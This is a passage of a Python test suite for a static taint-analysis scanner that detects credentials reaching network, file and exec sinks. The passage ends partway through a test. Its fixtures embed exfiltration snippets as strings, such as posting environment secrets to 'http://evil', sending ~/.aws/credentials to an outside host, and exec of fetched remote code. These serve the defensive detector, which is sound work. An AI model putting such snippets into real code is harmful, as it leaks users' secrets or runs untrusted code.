    def test_expired_workflow_deadline_marks_every_python_target_partial(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py"],
                "file_cache": {
                    "a.py": self._flows("a", 1),
                    "b.py": self._flows("b", 1),
                },
                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=0.0),
            }
        )

        assert result["findings"] == []
        assert [event["reason_code"] for event in result["inspection_ledger"]] == [
            "runtime_limit",
            "runtime_limit",
        ]


class _RuntimeBudgetError(RuntimeError):
    """Raised by the test's check_runtime once a call-count cap is reached."""


def _capped_check_runtime(max_calls: int):
    """A check_runtime callback that raises after *max_calls* invocations.

    A non-terminating or super-linear fixpoint trips the cap and fails the
    test fast, instead of spinning to the scan-wide deadline and hanging CI.
    """
    state = {"calls": 0}

    def check_runtime() -> None:
        state["calls"] += 1
        if state["calls"] > max_calls:
            raise _RuntimeBudgetError(f"check_runtime exceeded {max_calls} calls")

    return check_runtime


def _collect(code: str, check_runtime=None) -> dict:
    """Run `_collect_tainted` directly on *code* and return name -> source_call."""
    parsed = get_python_ast(None, code, "t.py")
    type_map = build_type_map(parsed.tree, parsed.import_aliases)
    tainted = behavioral_taint_tracking._collect_tainted(
        parsed.tree, type_map, parsed.import_aliases, check_runtime
    )
    return {name: tv.source_call for name, tv in tainted.items()}


class TestFixpointTermination:
    """The taint fixpoint must be monotone and linear, not order-dependent.

    These guard the two blockers in PR #611's second review: the previous
    "repeat every pass until values stop changing" loop could oscillate
    forever on cyclic re-assignments and was quadratic on reverse-ordered
    chains, letting a tiny crafted file spin the analyzer to the scan-wide
    deadline and disable taint analysis for every later Python file.
    """

    def test_cyclic_reassignment_terminates_and_taints_all(self) -> None:
        """The reviewer's oscillating module must converge, not spin forever.

        `x = os.getenv("A"); x = y; y = os.environ["B"]; y = z; z = x` made the
        old whole-value fixpoint swap the sources of x/y/z on every pass and
        never exit. Add-only taint can only grow, so it must terminate well
        inside the call cap and still taint all three names.
        """
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code, _capped_check_runtime(2000))
        assert set(sources) == {"x", "y", "z"}
        # Every name traces back to one of the two credential sources.
        assert set(sources.values()) <= {"os.getenv", "os.environ"}

    def test_cyclic_reassignment_flows_to_sink(self) -> None:
        """End to end: the oscillating module plus a sink still reports TT3."""
        code = (
            "import os, requests\n"
            'x = os.getenv("A")\n'
            "x = y\n"
            'y = os.environ["B"]\n'
            "y = z\n"
            "z = x\n"
            'requests.post("http://evil", data=z)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_reverse_ordered_chain_is_linear(self) -> None:
        """A reverse chain no longer needs N+1 passes over N assignments.

        `a3 = a2; a2 = a1; a1 = a0; a0 = os.getenv("K")` forced the old loop
        into one full pass per link. A monotone worklist taints each name once,
        so a few thousand links finish well inside a linear call cap (and far
        under a second) rather than quadratically.
        """
        depth = 3200
        lines = ["import os"]
        lines += [f"a{i} = a{i - 1}" for i in range(depth, 0, -1)]
        lines.append('a0 = os.getenv("K")')
        code = "\n".join(lines) + "\n"

        start = time.monotonic()
        # Linear bound: a small constant per assignment. A quadratic loop would
        # need ~depth passes and blow past this cap immediately.
        sources = _collect(code, _capped_check_runtime(depth * 20))
        elapsed = time.monotonic() - start

        assert len(sources) == depth + 1
        assert all(src == "os.getenv" for src in sources.values())
        assert elapsed < 1.0

    def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
        """Even with no runtime check at all (budget=None callers), it returns."""
        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
        sources = _collect(code)  # check_runtime=None
        assert set(sources) == {"x", "y", "z"}

    def test_wide_unpacking_fires_each_assignment_once(self, monkeypatch) -> None:
        """A wide propagating assignment must fire once, not once per read name.

        The reviewer's remaining blocker: `propagators` stored each propagating
        assignment once per distinct name its value reads, so for

            s0, s1, ..., sK = os.getenv("X")     # K names, seeded directly
            t0, t1, ..., tK' = s0, s1, ..., sK    # one Assign, K' targets

        draining each of the K tainted read names re-ran ``_mark_targets`` over
        the whole K'-target list, giving K x K' work. A ``check_runtime`` call
        cap cannot see this (the drain makes only K + 1 checks). So count
        ``_mark_targets`` calls directly and assert each assignment fires at
        most once: the total is bounded by the number of assignments, not by
        names read x targets.
        """
        width = 2000
        reads = ", ".join(f"s{i}" for i in range(width))
        targets = ", ".join(f"t{i}" for i in range(width))
        code = (
            "import os\n"
            f'{reads} = os.getenv("X")\n'  # direct source: taints s0..s{width-1}
            f"{targets} = {reads}\n"  # one propagating Assign with `width` targets
        )

        # There are exactly two Assign statements; linear drain must not call
        # _mark_targets more than once per assignment.
        n_assignments = 2
        calls = {"n": 0}
        orig_mark_targets = behavioral_taint_tracking._mark_targets

        def counting_mark_targets(*args, **kwargs):
            calls["n"] += 1
            return orig_mark_targets(*args, **kwargs)

        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)

        start = time.monotonic()
        sources = _collect(code, _capped_check_runtime(width * 20))
        elapsed = time.monotonic() - start

        # Fire-once: one call seeds the direct source, one fires the propagator.
        # The quadratic shape would call _mark_targets `width` times in the drain.
        assert calls["n"] <= n_assignments
        # All read and target names are tainted, all tracing to os.getenv.
        assert len(sources) == 2 * width
        assert all(src == "os.getenv" for src in sources.values())
        assert elapsed < 1.0


# ── Function scopes and interprocedural flows ─────────────────────────


def _code(text: str) -> str:
    """Dedent a test module; line 1 is the first line after the opening quotes."""
    return textwrap.dedent(text).lstrip("\n")


def _line(code: str, marker: str) -> int:
    """1-based line number of the only line containing *marker*."""
    (number,) = [i for i, line in enumerate(code.splitlines(), 1) if marker in line]
    return number


def _flows(code: str, rule: str = "TT3") -> list:
    return [f for f in _run(code) if f.rule_id == rule]


def _summary(code: str) -> list[tuple[str, int]]:
    return sorted((f.rule_id, f.start_line) for f in _run(code))


def _messages(code: str) -> list[str]:
    return [f.message for f in _run(code)]


class TestNameClashPrecision:
    """A tainted name in one scope must not taint a same-named name in another.

    Taint used to be keyed by bare variable name across the whole file. Once
    propagation became order-independent (#611), a tainted local such as
    ``headers`` in one function tainted every unrelated variable or parameter
    called ``headers`` in the file, reporting TT3 (CRITICAL) on sinks that never
    see the credential. Each case below is one class of the name clashes found
    in real skills.
    """

    def test_same_local_name_in_two_functions(self) -> None:
        code = _code(
            """
            import os, requests
            def probe_render():
                request = {"token": os.environ.get("RENDER_TOKEN")}
                return len(request)
            def probe_service(url):
                request = url + "/health"
                requests.get(request, timeout=5)
            """
        )
        assert _run(code) == []

    def test_parameter_named_like_a_tainted_local_in_either_order(self) -> None:
        helper = _code(
            """
            def fetch(url, headers):
                return requests.get(url, headers=headers)
            """
        )
        caller = _code(
            """
            def main():
                headers = {"Authorization": os.getenv("API_TOKEN")}
                print(headers)
                fetch("https://example.invalid/v1", {"Accept": "application/json"})
            """
        )
        for body in (helper + caller, caller + helper):
            assert _run("import os, requests\n" + body) == []

    def test_caller_local_not_passed_to_a_same_named_parameter(self) -> None:
        """The callee's ``text`` is a parameter; the caller's ``text`` never reaches it."""
        code = _code(
            """
            import hashlib, os
            def cache_file(text):
                key = hashlib.sha256(text.encode()).hexdigest()
                path = os.path.join("/tmp", key)
                open(path, "w").write("{}")
            def main(path):
                text = open(path).read()
                print(len(text))
                cache_file("constant")
            """
        )
        assert _run(code) == []

    def test_nested_function_parameter_named_like_a_tainted_variable(self) -> None:
        code = _code(
            """
            import json, subprocess, sys
            def make_runner():
                def runner(stage_path):
                    payload = json.dumps({"stage_path": stage_path})
                    subprocess.run(["worker"], input=payload)
                return runner
            def worker():
                job = json.loads(sys.stdin.read())
                stage_path = job["stage_path"]
                print(stage_path)
            """
        )
        assert _run(code) == []

    def test_loop_target_named_like_a_tainted_variable(self) -> None:
        code = _code(
            """
            import os, subprocess
            def configure():
                host = os.environ.get("REMOTE_HOST")
                return host
            def inspect(hosts):
                for host in hosts:
                    subprocess.run(["ssh", host, "true"])
            """
        )
        assert _run(code) == []

    def test_local_shadowing_a_tainted_global(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                TOKEN = "public"
                requests.post("https://example.invalid", data=TOKEN)
            """
        )
        assert _run(code) == []

    def test_method_parameter_named_like_a_tainted_local(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                def check(self):
                    token = os.getenv("API_TOKEN")
                    return bool(token)
                def send(self, token):
                    requests.post("https://example.invalid", data=token)
            Client().send("public")
            """
        )
        assert _run(code) == []

    def test_comprehension_target_named_like_a_tainted_variable(self) -> None:
        code = _code(
            """
            import os, requests
            url = os.getenv("WEBHOOK_URL")
            def ping(u):
                requests.get(u, timeout=5)
            def check(urls):
                [requests.get(url, timeout=5) for url in urls]
                return [ping(url) for url in urls]
            """
        )
        assert _run(code) == []

    def test_lambda_parameter_named_like_a_tainted_variable(self) -> None:
        code = _code(
            """
            import os, requests
            payload = os.getenv("API_TOKEN")
            send = lambda payload: requests.post("https://x.invalid", data=payload)
            send("public")
            """
        )
        assert _run(code) == []

    def test_class_body_names_are_invisible_to_methods(self) -> None:
        code = _code(
            """
            import os, requests
            token = "public"
            class Client:
                token = os.getenv("API_TOKEN")
                def send(self):
                    requests.post("https://x.invalid", data=token)
            """
        )
        assert _run(code) == []

    def test_instance_attributes_are_per_class(self) -> None:
        unrelated = _code(
            """
            import os, requests
            class Secret:
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
            class Public:
                def __init__(self):
                    self.token = "public"
                def send(self):
                    requests.post("https://example.invalid", data=self.token)
            """
        )
        siblings = _code(
            """
            import os, requests
            class ChatProvider:
                def chat(self, messages):
                    raise NotImplementedError
            class NvidiaProvider(ChatProvider):
                def __init__(self):
                    self.headers = {"Authorization": os.environ.get("NVIDIA_API_KEY")}
                def chat(self, messages):
                    return requests.post("https://nvidia.invalid", headers=self.headers)  # REAL
            class OllamaProvider(ChatProvider):
                def __init__(self):
                    self.headers = {"Content-Type": "application/json"}
                def chat(self, messages):
                    return requests.post("http://localhost:11434", headers=self.headers)
            """
        )
        sibling_methods = _code(
            """
            import os, requests
            class Backend:
                pass
            class CloudBackend(Backend):
                def auth_token(self):
                    return os.environ.get("CLOUD_TOKEN")
            class LocalBackend(Backend):
                def auth_token(self):
                    return "anonymous"
                def health(self):
                    return requests.get("http://localhost", params={"u": self.auth_token()})
            """
        )
        assert _run(unrelated) == []
        assert _summary(siblings) == [("TT3", _line(siblings, "# REAL"))]
        assert _run(sibling_methods) == []

    def test_only_the_parameter_receiving_the_secret_is_tainted(self) -> None:
        code = _code(
            """
            import os, requests
            def upload(url, payload):
                requests.get(url)  # CLEAN
                requests.post(url, data=payload)  # SINK
            def main():
                upload("https://example.invalid", os.getenv("API_TOKEN"))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    @pytest.mark.parametrize(
        "rebinding",
        [
            "import json as x\n    requests.post('https://x.invalid', data=x)",
            "try:\n        pass\n    except Exception as x:\n"
            "        requests.post('https://x.invalid', data=x)",
            "match cmd:\n        case [x]:\n            requests.post('https://x.invalid', data=x)",
            "match cmd:\n        case {'token': x}:\n"
            "            requests.post('https://x.invalid', data=x)",
            "z = [y for x in ['a', 'b'] for y in x]\n    requests.post('https://x.invalid', data=z)",
        ],
        ids=["import_as", "except_as", "match_sequence", "match_mapping", "later_iterable"],
    )
    def test_function_local_bindings_shadow_a_tainted_global(self, rebinding: str) -> None:
        """Each binding form makes ``x`` a local of the function, so the
        module-level secret named ``x`` never reaches the sink. (A later
        ``for`` of a comprehension iterates the comprehension's own ``x``.)"""
        code = f"import os, requests\nx = os.getenv('TOKEN')\ndef f(cmd):\n    {rebinding}\n"
        assert _run(code) == []
        # The same sink reading the global (no local binding) is reported.
        unbound = "import os, requests\nx = os.getenv('TOKEN')\ndef f(cmd):\n    z = x\n" + (
            "    requests.post('https://x.invalid', data=z)\n"
        )
        assert [f.rule_id for f in _run(unbound)] == ["TT3"]


class TestDirectCalls:
    """Arguments of direct in-file calls bind to parameters; returns reach callers."""

    def test_helper_returns(self) -> None:
        same_name = _code(
            """
            import os, requests
            def get_key():
                key = os.getenv("API_KEY")
                return key
            def send():
                key = get_key()  # ASSIGN
                requests.post("https://example.invalid", data=key)  # SINK
            """
        )
        other_name = same_name.replace("key = get_key()", "value = get_key()").replace(
            "data=key", "data=value"
        )
        for code, name in ((same_name, "key"), (other_name, "value")):
            (finding,) = _flows(code)
            assert finding.start_line == _line(code, "# SINK")
            assert f"'{name}' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message

    def test_helper_called_inside_the_sink(self) -> None:
        code = _code(
            """
            import os, requests
            def get_key():
                return os.environ["API_KEY"]  # RETURN
            requests.post("https://example.invalid", data=get_key())
            """
        )
        (finding,) = _flows(code)
        assert finding.message == (
            f"Tainted flow: 'get_key()' from os.environ (line {_line(code, '# RETURN')}, "
            "credential/environment) → requests.post (network output)"
        )

    def test_chained_and_nested_helpers(self) -> None:
        chained = _code(
            """
            import os, requests
            def raw():
                return os.getenv("API_KEY")
            def normalized():
                return raw().strip()
            requests.post("https://example.invalid", data=normalized())
            """
        )
        nested = _code(
            """
            import os, requests
            def outer():
                token = os.getenv("API_TOKEN")
                def inner(value):
                    requests.post("https://example.invalid", data=value)
                def free():
                    requests.post("https://example.invalid", data=token)
                inner(token)
                free()
            """
        )
        nonlocal_rebinding = _code(
            """
            import os, requests
            def outer():
                token = None
                def load():
                    nonlocal token
                    token = os.getenv("API_TOKEN")
                load()
                requests.post("https://example.invalid", data=token)
            """
        )
        assert len(_flows(chained)) == 1
        assert len(_flows(nested)) == 2
        assert len(_flows(nonlocal_rebinding)) == 1

    def test_argument_binding(self) -> None:
        for call in (
            "upload(secret)",
            "upload(payload=secret)",
            "upload(*[secret])",
            "upload(**{'payload': secret})",
            'upload(os.getenv("API_KEY"))',
            "wrapper(secret)",
        ):
            code = _code(
                f"""
                import os, requests
                def upload(payload):
                    requests.post("https://example.invalid", data=payload)
                def wrapper(*args, **kwargs):
                    return upload(*args, **kwargs)
                def main():
                    secret = os.getenv("API_KEY")
                    {call}
                """
            )
            assert len(_flows(code)) == 1, call
        # A forwarded ``**kwargs`` binds only into the callee's own ``**``
        # parameter, which ``upload`` lacks: the keyword is not followed.
        forwarded = code.replace("wrapper(secret)", "wrapper(payload=secret)")
        assert _run(forwarded) == []

    def test_defaults_varargs_and_kwargs(self) -> None:
        for definition, call in (
            ("def send(*value):", 'send("x", os.getenv("API_KEY"))'),
            ("def send(**value):", 'send(key=os.getenv("API_KEY"))'),
            ('def send(value=os.getenv("API_KEY")):', "send()"),
            ('def send(*, value=os.getenv("API_KEY")):', "send()"),
            ("def send(a, b, /, value):", 'send(1, 2, os.getenv("API_KEY"))'),
        ):
            code = _code(
                f"""
                import os, requests
                {definition}
                    requests.post("https://example.invalid", data=value)
                {call}
                """
            )
            assert len(_flows(code)) == 1, definition

    def test_immediately_called_lambda_defaults_hold_their_value(self) -> None:
        """A default ``(lambda: ...)()`` holds the lambda's return value, so its
        body is read; a default that is a lambda holds a function and is not."""
        for definition in (
            'def f(tok=(lambda: os.getenv("API_TOKEN"))()):',
            'def f(*, tok=(lambda: os.getenv("API_TOKEN"))()):',
            'def f(tok=(lambda k: os.getenv(k))("API_TOKEN")):',
            'f = lambda tok=(lambda: os.getenv("API_TOKEN"))(): requests.post(URL, data=tok)',
        ):
            body = "" if definition.startswith("f = ") else "    requests.post(URL, data=tok)\n"
            code = f'import os, requests\nURL = "https://x.invalid"\n{definition}\n{body}'
            assert [f.rule_id for f in _run(code)] == ["TT3"], definition
        not_called = (
            "import os, requests\n"
            'def f(tok=lambda: os.getenv("API_TOKEN")):\n'
            '    requests.post("https://x.invalid", data=tok)\n'
        )
        assert _run(not_called) == []

    def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
        cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS

        def module(width: int, tainted: int, read: int) -> str:
            params = ", ".join(f"p{i}" for i in range(width))
            args = ", ".join(
                'os.getenv("API_KEY")' if i == tainted else str(i) for i in range(width)
            )
            return (
                "import os, requests\n"
                f"def send({params}):\n"
                f'    requests.post("https://example.invalid", data=p{read})\n'
                f"send({args})\n"
            )

        # The first argument past the explicit slots (index == cap) and a later one.
        assert len(_flows(module(cap + 1, cap, cap))) == 1
        assert len(_flows(module(cap + 4, cap + 3, cap + 3))) == 1
        # Arguments past the cap never reach the explicit parameters before it.
        assert _flows(module(cap + 1, cap, 0)) == []
        assert _flows(module(cap + 1, cap, cap - 1)) == []
        # The argument at exactly index ``cap`` also reaches ``*rest``, as a
        # function argument and after an implicit ``self`` (offset 1).
        leading = ", ".join(["0"] * cap)
        star = (
            "import os, requests\n"
            "def send(*rest):\n"
            '    requests.post("https://example.invalid", data=rest)\n'
            f'send({leading}, os.getenv("API_KEY"))\n'
        )
        method = (
            "import os, requests\n"
            "class Api:\n"
            f"    def send(self, {', '.join(f'p{i}' for i in range(cap - 1))}, *rest):\n"
            '        requests.post("https://example.invalid", data=rest)\n'
            "    def run(self):\n"
            f'        self.send({", ".join(["0"] * (cap - 1))}, os.getenv("API_KEY"))\n'
        )
        assert len(_flows(star)) == 1
        assert len(_flows(method)) == 1

    def test_unpacked_arguments_bind_by_position_and_name(self) -> None:
        """``*seq`` fills parameters from its position on; ``**mapping`` fills
        keyword-only parameters and ``**kwargs`` as well as named ones."""
        for definition, call in (
            ("def send(label, value):", 'send(*["public", os.getenv("API_KEY")])'),
            ("def send(label, value):", 'send("public", *[os.getenv("API_KEY")])'),
            ("def send(*, value):", 'send(**{"value": os.getenv("API_KEY")})'),
            ("def send(**value):", "send(**opts)"),
            ("def send(*, value):", "send(**opts)"),
        ):
            code = _code(
                f"""
                import os, requests
                opts = {{"value": os.getenv("API_KEY")}}
                {definition}
                    requests.post("https://example.invalid", data=value)  # SINK
                {call}
                """
            )
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], (definition, call)
        # A ``*seq`` starting after a parameter never fills that parameter.
        before = _code(
            """
            import os, requests
            def send(value, label):
                requests.post("https://example.invalid", data=value)
            send("public", *[os.getenv("API_KEY")])
            """
        )
        assert _run(before) == []

    def test_forwarding_wrappers_reach_the_named_parameter(self) -> None:
        code = _code(
            """
            import os, requests
            def upload(url, payload):
                requests.post(url, data=payload)  # SINK
            def wrapper(*args, **kwargs):
                return upload(*args, **kwargs)
            def main():
                secret = os.getenv("API_KEY")
                wrapper("https://example.invalid", secret)
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_keywords_bind_only_their_named_parameter(self) -> None:
        """A keyword naming a parameter never also lands in ``**kwargs``."""
        for definition, call in (
            ("def call_api(url, token=None, **params):", 'token=os.environ["API_TOKEN"], q="x"'),
            ("def call_api(url, *, token=None, **params):", 'token=os.environ["API_TOKEN"]'),
        ):
            code = _code(
                f"""
                import os, requests
                {definition}
                    headers = {{"Authorization": f"Bearer {{token}}"}}
                    return requests.get(url, params=params)
                call_api("https://example.invalid", {call})
                """
            )
            assert _run(code) == [], definition
        method = _code(
            """
            import os, subprocess
            class Runner:
                def run(self, cmd, dry_run=None, **popen_kwargs):
                    subprocess.run(cmd, **popen_kwargs)
                def go(self):
                    self.run(["ls"], dry_run=input())
            """
        )
        assert _run(method) == []
        # Unnamed keywords, and positional-only names, do reach ``**kwargs``.
        for definition, call in (
            ("def call_api(url, token=None, **params):", 'q=os.environ["API_TOKEN"]'),
            ("def call_api(url, token=None, /, **params):", 'token=os.environ["API_TOKEN"]'),
        ):
            code = _code(
                f"""
                import os, requests
                {definition}
                    return requests.get(url, params=params)  # SINK
                call_api("https://example.invalid", {call})
                """
            )
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], definition
        # A keyword never fills a positional-only parameter, even when a
        # redefinition of the callee takes that name as a keyword.
        redefined = _code(
            """
            import os, requests
            def send(value, /):
                requests.post("https://example.invalid", data=value)
            def send(value):
                print(value)
            send(value=os.getenv("API_KEY"))
            """
        )
        assert _run(redefined) == []

    def test_a_lambda_bound_to_many_names_is_one_callee(self) -> None:
        code = _code(
            """
            import os, requests
            a = b = c = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
            def b(other):
                print(other)
            b(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
        parsed = get_python_ast(None, code, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree)
        groups = {id(group): group for group in index.function_groups.values()}
        # The lambda and the ``def b`` it shares a name with are one callee
        # that ``a``, ``b`` and ``c`` all reach; nothing is copied per name.
        assert len(index.function_groups) == 3
        (group,) = groups.values()
        assert len(group.functions) == 2

    def test_recursion_terminates(self) -> None:
        code = _code(
            """
            import os, requests
            def ping(value):
                requests.post("https://example.invalid", data=value)
                return pong(value)
            def pong(value):
                return ping(value)
            ping(os.getenv("API_TOKEN"))
            """
        )
        assert len(_flows(code)) == 1

    def test_redefinitions_merge_into_one_callee(self) -> None:
        code = _code(
            """
            import os, requests
            def send(body):
                print(body)
            def send(body):
                requests.post("https://example.invalid", data=body)  # SINK
            send(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_global_assigned_inside_a_function(self) -> None:
        code = _code(
            """
            import os, requests
            def configure(value):
                global TOKEN
                TOKEN = value
            def send():
                requests.post("https://example.invalid", data=TOKEN)
            configure(os.getenv("API_TOKEN"))
            """
        )
        assert len(_flows(code)) == 1

    def test_lambdas_bound_to_names_and_called_inline(self) -> None:
        named = _code(
            """
            import os, requests
            post_secret = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
            def main():
                value = os.getenv("API_TOKEN")
                post_secret(value)
            """
        )
        returned = _code(
            """
            import os, requests
            token = lambda: os.getenv("API_TOKEN")  # RETURN
            requests.post("https://x.invalid", data=token())  # SINK
            """
        )
        assert _summary(named) == [("TT3", _line(named, "# SINK"))]
        assert _summary(returned) == [("TT3", _line(returned, "# SINK"))]

    def test_exec_and_file_flows_through_helpers(self) -> None:
        exec_flow = _code(
            """
            import requests, subprocess
            def fetch():
                return requests.get("https://x.invalid/script").text
            def run(command):
                subprocess.run(command, shell=True)
            run(input())
            exec(fetch())
            """
        )
        file_flow = _code(
            """
            import os, requests
            def read():
                return open(os.path.expanduser("~/.aws/credentials")).read()
            creds = read()
            requests.post("https://x.invalid", data=creds)
            """
        )
        assert [f.rule_id for f in _run(exec_flow)] == ["TT5", "TT5"]
        assert [f.rule_id for f in _run(file_flow)] == ["TT4"]

    def test_token_from_helper_header_builder_reaches_request(self) -> None:
        """A token loaded by a helper, put in an auth header and sent, is TT3."""
        code = _code(
            """
            import os, requests
            def load_token():
                token = os.getenv("SERVICE_TOKEN")
                return token.strip() if token else None
            def auth_headers(token=None):
                if token is None:
                    token = load_token()
                return {"Authorization": f"Bearer {token}"}
            def service_get(url, *, headers=None):
                request_headers = dict(headers or {})  # COPY
                return requests.get(url, headers=request_headers)  # SINK
            def check(url):
                return service_get(url, headers=auth_headers())
            """
        )
        (finding,) = _flows(code)
        assert finding.start_line == _line(code, "# SINK")
        assert f"'request_headers' from os.getenv (line {_line(code, '# COPY')}," in (
            finding.message
        )


class TestContextSensitivity:
    """One caller's secret must not taint other calls of the same helper."""

    def test_helper_result_is_tainted_only_where_the_secret_is_passed(self) -> None:
        code = _code(
            """
            import os, requests
            def _headers(token=None):
                h = {"Accept": "application/json"}
                if token:
                    h = {"Accept": "application/json", "Authorization": f"Bearer {token}"}
                return h
            def private_api():
                return requests.get("https://api.invalid/me", headers=_headers(os.getenv("T")))  # SINK
            def public_status():
                return requests.post("https://status.invalid/ping", headers=_headers())
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_pure_transform_helper_does_not_leak_between_callers(self) -> None:
        code = _code(
            """
            import os, json, requests
            def to_json(obj):
                return json.dumps(obj, indent=2)
            def save_config():
                cfg = {"api_key": os.getenv("API_KEY")}
                print(to_json(cfg))
            def report(results):
                requests.post("https://telemetry.invalid", data=to_json(results))
            """
        )
        assert _run(code) == []

    def test_closures_and_lambdas_do_not_leak_between_callers(self) -> None:
        closure = _code(
            """
            import os, requests
            def wrap(value):
                def inner():
                    return value
                return inner()
            def log_key():
                print(wrap(os.getenv("API_KEY")))
            def upload():
                body = wrap("public text")
                requests.post("https://example.invalid", data=body)
            """
        )
        lambda_closure = closure.replace(
            "def inner():\n        return value\n    return inner()",
            "get = lambda: value\n    return get()",
        )
        named_lambda = _code(
            """
            import base64, os, requests
            b64 = lambda text: base64.b64encode(text.encode()).decode()
            def auth_header():
                return "Basic " + b64("user:" + os.getenv("PASSWORD", ""))
            def upload(report):
                requests.post("https://example.invalid/upload", data=b64(report))
            """
        )
        assert "get = lambda: value" in lambda_closure
        for code in (closure, lambda_closure, named_lambda):
            assert _run(code) == [], code

    def test_secrets_still_flow_through_arguments_globals_and_attributes(self) -> None:
        code = _code(
            """
            import os, requests
            def remember(value):
                global TOKEN
                TOKEN = value
            class Holder:
                def __init__(self, secret):
                    self.keep(secret)
                def keep(self, value):
                    self.value = value
                def send(self):
                    requests.post("https://x.invalid", data=self.value)  # ATTR
            def wrap(value):
                return {"v": value}
            def main():
                secret = os.getenv("API_KEY")
                remember(secret)
                Holder(secret)
                requests.post("https://x.invalid", json=wrap(secret))  # ARG
            def later():
                requests.post("https://x.invalid", data=TOKEN)  # GLOBAL
            """
        )
        assert _summary(code) == sorted(
            ("TT3", _line(code, marker)) for marker in ("# ATTR", "# ARG", "# GLOBAL")
        )

    def test_inline_source_through_a_helper_is_reported_once(self) -> None:
        network = _code(
            """
            import requests
            def wrap(text):
                return {"q": text}
            requests.post("https://api.invalid/search", json=wrap(input("query: ")))
            """
        )
        command = _code(
            """
            import os, subprocess
            def make_cmd(binary):
                return [binary, "--version"]
            subprocess.run(make_cmd(os.environ.get("TOOL_BIN")))
            """
        )
        assert [f.rule_id for f in _run(network)] == ["TT1"]
        assert [f.rule_id for f in _run(command)] == ["TT1"]

    def test_nested_in_file_calls_bind_through_their_values(self) -> None:
        code = _code(
            """
            import os, requests
            def ident(value):
                return value
            def send(body):
                requests.post("https://x.invalid", data=body)  # SINK
            def main():
                send(ident(ident(os.getenv("API_KEY"))))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]


class TestMethods:
    """``self.m``/``cls.m``/``Class.m``/``super().m`` and ``Class(...)`` bind syntactically."""

    def test_self_and_cls_methods(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                def _token(self):
                    return os.getenv("API_TOKEN")  # SOURCE
                def send(self):
                    requests.post("https://x.invalid", data=self._token())  # RETURNED
                def _post(self, body):
                    requests.post("https://x.invalid", data=body)  # BOUND
                def run(self):
                    self._post(os.getenv("OTHER"))
                @classmethod
                def _class_post(cls, body):
                    requests.post("https://x.invalid", data=body)  # CLASSMETHOD
                @classmethod
                def run_class(cls):
                    cls._class_post(os.getenv("OTHER"))
            """
        )
        assert _summary(code) == sorted(
            ("TT3", _line(code, marker)) for marker in ("# RETURNED", "# BOUND", "# CLASSMETHOD")
        )
        (returned,) = [f for f in _run(code) if f.start_line == _line(code, "# RETURNED")]
        assert returned.message.startswith(
            f"Tainted flow: 'self._token()' from os.getenv (line {_line(code, '# SOURCE')},"
        )

    def test_methods_bind_only_into_their_own_class_or_bases(self) -> None:
        code = _code(
            """
            import os, requests
            class Api:
                def upload(self, body):
                    print(body)
                def run(self):
                    self.upload(os.getenv("API_TOKEN"))
            class Mirror:
                def upload(self, body):
                    requests.post("https://example.invalid", data=body)
            class Sub(Api):
                def go(self):
                    self.upload(os.getenv("API_TOKEN"))
            """
        )
        assert _run(code) == []

    def test_bases_are_searched_left_to_right(self) -> None:
        code = _code(
            """
            import os, requests
            class Local:
                def send(self, body):
                    print(body)
            class Remote:
                def send(self, body):
                    requests.post("https://x.invalid", data=body)
            class Client(Local, Remote):
                def run(self):
                    self.send(os.getenv("API_KEY"))
            """
        )
        assert _run(code) == []
        flipped = code.replace("class Client(Local, Remote):", "class Client(Remote, Local):")
        assert [f.rule_id for f in _run(flipped)] == ["TT3"]

    def test_attribute_getters_return_what_a_call_stored(self) -> None:
        """Attributes are class state: a parameter stored on ``self`` is read back
        by getters, not only by direct ``self.x`` reads."""
        code = _code(
            """
            import os, requests
            class Holder:
                def keep(self, value):
                    self.value = value
                def get(self):
                    return self.value
                def run(self):
                    self.keep(os.getenv("API_KEY"))
                def send(self):
                    requests.post("https://x.invalid", data=self.get())  # SINK
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_nearest_in_file_base_defines_the_method(self) -> None:
        code = _code(
            """
            import os, requests
            from typing import Generic, TypeVar
            T = TypeVar("T")
            class Transport:
                def _post(self, body):
                    requests.post("https://x.invalid", data=body)  # SINK
            class Mixin:
                pass
            class Base(Generic[T], Transport):
                pass
            class Client(Mixin, Base[dict]):
                def report(self):
                    self._post(os.getenv("API_KEY"))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_class_object_calls_pass_the_receiver_explicitly(self) -> None:
        true_flow = _code(
            """
            import os, requests
            class Base:
                def __init__(self, token):
                    requests.post("https://x.invalid", data=token)  # SINK
            class Child(Base):
                def __init__(self):
                    token = os.getenv("TOKEN")
                    Base.__init__(self, token)
            """
        )
        shifted = _code(
            """
            import os, requests
            class Base:
                def __init__(self, user, body):
                    print(user)
                    requests.post("https://x.invalid", data=body)
            class Child(Base):
                def __init__(self):
                    Base.__init__(self, os.getenv("USER_NAME"), "public")
            """
        )
        static_and_class = _code(
            """
            import os, requests
            class Api:
                @staticmethod
                def send(body):
